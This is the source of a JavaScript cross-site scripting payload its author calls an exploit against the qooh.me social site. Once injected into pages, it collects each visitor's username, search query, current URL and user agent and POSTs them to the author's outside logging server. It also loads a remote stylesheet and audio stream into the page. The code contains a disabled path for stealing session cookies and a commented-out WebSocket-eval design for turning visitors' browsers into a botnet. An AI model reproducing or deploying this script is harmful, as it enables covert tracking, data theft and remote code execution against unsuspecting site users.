/* http://qooh.me/ :: http://m.qooh.me/ - Copyright (c) DarkFox 2013
 *
 * This exploit tells me a number of things about the user and streams music
 * live from my laptop to the visitor. Below I mention what I fetch from the
 * user.
 *
 * - Timestamp of the visitor's visit.
 *
 * - The visitors IP address.
 *
 * - The page that the user is visiting when the exploit ran
 *
 * - The user's session cookie [Disabled]
 *
 * - Their username
 *   
 * - Search query if they ran the code through searching for people on the
 *   find_people page.
 *
 * - The browser's user agent.
 * 
 *
 * The exploit sends the messages through two methods.
 *
 * - Send a message to the above frame the username of the user using html5
 *   postMessage.
 *
 * - Make a request to a logging script to record down their data as listed
 *   above.
 *
 *
 * Copyright (c) DarkFox, 2013.
 * 
 */

"use strict";

(function () {

    // Don't re-run per multiple injection.
    if (typeof window.owned == "boolean") return

    window.owned = true;
    var l, u, q, x;

    // Define s helper to set multiple attributes in a monadic way.
    function s () {
        this.setAttribute.apply(this, arguments);
        return this
    }

    // Add audio to the page.
    function addAudio () {
        var a = new Audio;
        a.src      = "http://darkfox.us.to:8000"
        a.autoplay = a.loop = a.controls = true;
        
        /* If the user is on a page with the profile information on the side
         * then append the audio tag there so the user can notice and control
         * the music from there. If we can't find this element, then just append
         * to the body.
         */
        (document.querySelector(".profile-info span:nth-child(3)")
            || document.body)
          .appendChild(a);
    }


    /** Fetch useful information **/

    // Grab the username of the user from their navigation menu / profile link.
    u = document.querySelector("li:nth-child(2) a")
                .getAttribute("href")
                .slice(1);

    /* If the user has searched for a user.... Who have they searched for?
     * Due to the prevention of running the script multiple times, I only log
     * the first search that causes the script to run. If they search again,
     * I don't listen for more searches. This would complicate this script for
     * no real benefit.
     */
    if (location.pathname == "/account/find_people/")
        q = document.querySelector("#search").value;


    /** Change the theme of the page **/

    (l = document.createElement("link")).s = s.bind(l);
    l.s("rel",  "stylesheet")
     .s("type", "text/css")
     .s("href", "http://darknfoxy.us.to/exploits/qooh.me/darkfox.css");
    document.body.appendChild(l);

    /* Depending on if the page has been loaded in an iframe, start playing
     * music or send to the top window the username.
     */
    if (top == window || 
            (location.href ==
               "http://m.qooh.me/account/find_people/#redirect" &&
             typeof top.location.href == "string"
            )) {
        document.readyState == "complete"
            ? addAudio()
            : document.addEventListener("ready", addAudio);
    } else top.postMessage(u, "http://darkfox.us.to");


    /** Log the user **/

    /* Send an XHR to my logger to keep track of the user's username,
     * current page, ip and user agent.
     */
    (x=new XMLHttpRequest() || ActiveXObject("Microsoft.XMLHTTP"))
        .open("POST",
              "http://darknfoxy.us.to/exploits/log.php",
              1);

    /* Because we are sending our requested data through a POST in the
     * urlencoded format we need to tell the server how to expect the
     * information so that it can log as expected.
     */
    x.setRequestHeader("Content-type",
                       "application/x-www-form-urlencoded");
    x.send((function(j){
        var a = [];
        for (var k in j)
          a.push(escape(k) + "=" + escape(j[k]));
        return a.join("&");
      })({ a: location.href
         , c: false ? document.cookie : "disabled"
         , u: u.indexOf("user/") == 0 ? "/guest" : u
         , s: "qooh"
         , q: q
         }));

    /* Above we send a few things.
     *
     * - The address that the user is currently viewing that caused the
     *   exploit to run.
     *
     * - Send back the user's session cookies. [Disabled]
     *
     * - The user's username provided from the navigation.
     *
     * - We tell my logger that the site / log-file is qooh to keep everything
     *   organised.
     *
     * - Send the user's search query if they got my code to run through the
     *   find_people page.
     *
     *
     * While sending information, we could also turn the browser into a botnet
     * by very using a websocket. This is disabled due to the amount of power
     * one would gain from having live Javascript consoles to each user's
     * browser. - Yes, this is on my todo list. ;-)
     *
     * WebSocket("ws://0x45a4dbd0:6120")
     *   .addEventListener("message", function (e) {
     *     this.send((0,eval)(e.data))
     *   });
     */
})();
